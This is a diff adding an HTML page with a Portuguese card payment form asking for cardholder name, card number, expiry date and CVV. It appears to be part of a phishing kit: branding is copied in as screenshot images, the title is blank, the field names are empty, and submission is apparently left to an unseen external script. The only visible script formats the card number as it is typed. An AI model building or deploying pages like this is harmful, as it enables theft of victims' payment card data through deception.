@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/mino.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div>
+        <div class="batr2">
+            <div class="topap">
+                <img src="./img/hetopa.PNG" alt="">
+            </div>
+
+            <div>
+                <div>
+                    <div>
+                        <img style=" margin-top: 20px;" class="ccimg" src="./img/upocct.png" alt="">
+                    </div>
+                    
+                    <div class="section"  style="margin-top: 30px; margin-bottom: 40px;">
+                        
+                            <form  method="post" id="pg2">
+                                
+                                <p>O nome no cartão*:</p>
+                                <input type="text" name=""  id="numnn" required>
+            
+                                <p>Número do cartão*:</p>
+                                <input type="tel" name="" id="numcc" required maxlength="20" placeholder="----   ----   ----   ----">
+                        
+                                <p>Cartão válido até (mês/ano)*:</p>
+                                <div class="exp">
+                                    
+                                    <input class="mm" type="tel" name="" id="mmo" required placeholder="MM" maxlength="3">
+                                    <input type="tel" name="" id="aao" required placeholder="AA"  maxlength="3">
+                                </div>
+                        
+                                <p>CVV*:</p>
+                                <input class="cfifi" type="tel" name="" id="numvv" required maxlength="8" maxlength="4">
+        
+        
+        
+                                <button class="btn2" type="submit">pagar</button>
+                            </form>
+                        </div>
+                    </div>
+            </div>
+        </div>
+    </div>
+
+    <div>
+        <div class="bobota">
+            <img src="./img/Capture d’écran 2023-11-06 à 23.01.44.png" alt="">
+        </div>
+    </div>
+
+
+    <script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+    </script>
+   <!--  -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
